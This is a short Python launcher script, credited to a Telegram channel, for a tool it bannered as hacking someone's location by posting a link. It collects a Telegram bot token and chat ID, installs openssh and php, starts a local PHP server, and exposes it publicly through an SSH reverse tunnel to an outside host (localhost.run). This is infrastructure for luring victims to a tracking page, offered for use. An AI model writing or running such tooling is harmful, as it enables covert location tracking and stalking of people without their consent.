#/usr/bin/env python3
# code by T.ME/ANDROVIRUS

import os
os.system("clear")
print(''' \033[92m
      📍𝙃𝙖𝙘𝙠 𝙡𝙤𝙘𝙖𝙩𝙞𝙤𝙣 𝙗𝙮 𝙥𝙤𝙨𝙩𝙞𝙣𝙜 𝙡𝙞𝙣𝙠🗺
   #####################################

''')
open('bot-data.txt', 'w').close()
token = input("Enter The Bot Token: ")
chat_id = input("Enter The Your Chat ID: ")
f = open("bot-data.txt", "a")
f.write(token+"$"+chat_id)
f.close()
os.system("apt  install  openssh  php -y | php -S localhost:3333 | ssh -R 80:localhost:3333 ssh.localhost.run")


